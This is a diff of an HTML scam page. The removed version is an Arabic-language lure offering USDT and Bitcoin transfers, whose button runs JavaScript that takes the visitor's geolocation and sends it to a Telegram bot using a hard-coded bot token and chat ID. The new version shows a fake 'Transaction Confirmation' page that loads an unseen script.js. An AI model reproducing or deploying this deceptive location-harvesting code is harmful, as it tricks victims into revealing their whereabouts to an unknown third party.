@@ -2,68 +2,19 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>عملات رقمية USDT وبيتكوين</title>
-  <style>
-    body {
-      background-color: #0e0e0e;
-      color: gold;
-      font-family: 'Arial', sans-serif;
-      text-align: center;
-      padding: 30px;
-    }
-    .bitcoin-logo {
-      width: 100px;
-      margin: 20px auto;
-    }
-    h1 {
-      font-size: 2em;
-      margin-bottom: 30px;
-    }
-    button {
-      font-size: 1.2em;
-      padding: 15px 30px;
-      background-color: gold;
-      border: none;
-      border-radius: 8px;
-      color: black;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #ffd700;
-    }
-  </style>
+  <title>Transaction Confirmation</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <img class="bitcoin-logo" src="https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg" alt="Bitcoin Logo">
-  <h1>عملات رقمية USDT وبيتكوين</h1>
-  <p>لضمان استلام أموالك الرقمية،</p>
-  <button onclick="getLocation()">رجاءً اضغط لتحويل المال لمحفظتك</button>
+  <div class="container">
+    <video id="vid" autoplay muted playsinline>
+      <source src="usdt.mp4" type="video/mp4" />
+      Your browser does not support HTML5 video.
+    </video>
+    <p class="status">Checking transaction status...</p>
+  </div>
 
-  <script>
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendToTelegram);
-      }
-    }
-
-    function sendToTelegram(position) {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
-      const message = `📍 موقع جديد:\nLatitude: ${lat}\nLongitude: ${lon}`;
-      const token = '8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0';
-      const chatId = '7301527017';
-      const url = `https://api.telegram.org/bot${token}/sendMessage`;
-
-      fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
-        })
-      });
-    }
-  </script>
+  <script src="script.js"></script>
 </body>
 </html>
